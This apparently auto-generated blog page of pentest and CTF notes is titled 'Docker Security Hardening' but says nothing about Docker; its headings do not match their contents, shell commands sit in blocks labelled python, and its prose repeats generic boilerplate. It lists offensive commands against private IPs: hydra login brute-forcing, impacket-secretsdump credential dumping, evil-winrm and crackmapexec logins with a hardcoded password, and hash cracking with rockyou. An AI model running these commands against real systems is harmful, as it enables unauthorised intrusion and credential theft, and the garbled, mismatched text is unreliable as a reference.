---
TitleSEO: "Docker Security Hardening | ZureFX"
TitlePost: "Docker Security Hardening"
Author: "ZureFX"
Description: "Personal notes on Docker Security Hardening. Quick reference for pentesting and CTF challenges."
Keywords: "privilege escalation, enumeration, networking"
URL: "https://zurefx.github.io/notes/note-docker-security-hardening-112.html"
URL_IMAGES: ""
Date: "2024-01-21"
Tags: "Privilege Escalation, Enumeration, Networking"
Section: "notes"
Lang: "en"
main_img: "note-docker-security-hardening-112"
Permalink: "/notes/note-docker-security-hardening-112.html"
BtnLabel: "Read Notes"
Pick: 0
---
## ldapsearch

### Spring

```bash
gobuster dir -u http://10.96.69.81/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.240.214
gobuster dir -u http://10.120.182.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.242.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```python
nmap -sCV -p5985,1433,135 10.79.169.220 -oN scan.txt
evil-winrm -i 10.128.70.135 -u administrator -p 'P@ssw0rd!'
```

```python
feroxbuster -h
evil-winrm -i 10.95.126.140 -u administrator -p 'P@ssw0rd!'
```

## nikto

### C#

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `lookupsid`
- `sharphound`
- `GetNPUsers`
- `Pass the Ticket`

> **Note:** Kerberoasting was identified as the primary attack vector in this scenario.

- `socat`
- `SSTI`
- `rubeus`
- `DCSync`
- `mimikatz`
- `bloodhound`

## PowerShell

### Flask

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.156.231
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

- `DNS Rebinding`
- `wmiexec`
- `DLL Hijacking`

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.117.86.2
```

## rpcclient

### feroxbuster

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.116.237.47 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.198.64/FUZZ
crackmapexec smb 10.42.123.4 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.13.236 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `CORS Misconfiguration`
- `Remote Code Execution`
- `ACL Abuse`
- `socat`

```bash
evil-winrm -i 10.100.135.1 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p389,1433,22 10.20.187.229 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.62.149
evil-winrm -i 10.87.19.100 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.
